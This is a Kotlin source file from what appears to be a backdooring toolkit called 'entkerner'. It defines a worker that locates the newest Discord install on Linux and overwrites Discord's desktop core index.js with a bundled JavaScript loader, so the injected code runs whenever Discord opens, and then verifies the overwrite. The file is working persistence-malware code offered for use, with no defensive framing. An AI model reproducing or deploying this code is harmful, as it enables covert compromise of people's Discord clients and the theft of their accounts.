package net.kerner.entkerner.backdoor.discord

import io.ktor.client.*
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.abstract.*
import net.kerner.entkerner.io.FileUtils
import net.kerner.entkerner.io.FileUtils.Linux.config
import net.kerner.entkerner.io.JavaClassLoaderResources
import net.kerner.entkerner.io.nullPath
import net.kerner.entkerner.io.nullPaths
import java.io.File
import java.nio.file.Path
import kotlin.io.path.div

/**
 * lets you execute JS code whenever Discord is beeing opened
 */
class DiscordBootOverwriteWorker(main: Entkerner, ioClient: HttpClient) : AbstractBackdooringWorker(ioClient, main) {
    override val name: String = "DiscordBootOverwrite"
    override val file: SystemFileURI = object : SystemFileURI() {
        private val DISCORD_VERSION_REGEX = "\\d{1,2}[\\.]{1}\\d{1,2}[\\.]\\d{1,2}".toRegex()
        val config = object : SystemFileURI() {
            override val linux: Path = FileUtils.Linux.config / "discord" // i just know linux idk how windows
            override val windows: Path = nullPath // todo
            override val darwin: Path = nullPath // todo
        }

        val maxFileLong = config[system].toFile().listFiles { _, s ->
                s.matches(DISCORD_VERSION_REGEX)
            }?.map { file -> file.name.replace(".", "").toLong() }?.maxOf { it }
        val file = config[system].toFile().listFiles { _, s ->
            s.replace(".", "").toLong() == maxFileLong
        }?.first() ?: error("maxFileLong = $maxFileLong could not be found")

        override val linux: Path = file.toPath() / "modules" / "discord_desktop_core" / "index.js"
        override val windows: Path = nullPath
        override val darwin: Path = nullPath
    }
    private val customLoader = JavaClassLoaderResources.getResource("discord_boot_overwrite.js")?.readText()
            ?: error("discord_boot_overwrite.js could not be found in the resources")
    override fun buildDoor(file: File): Boolean {
        if(customLoader.isEmpty()) return false
        if (!file.exists()) return false
        file.setReadable(true)
        file.setWritable(true)
        file.writeText(customLoader)
        // verifies that given content was written
        return file.reader().readText() == customLoader
    }
}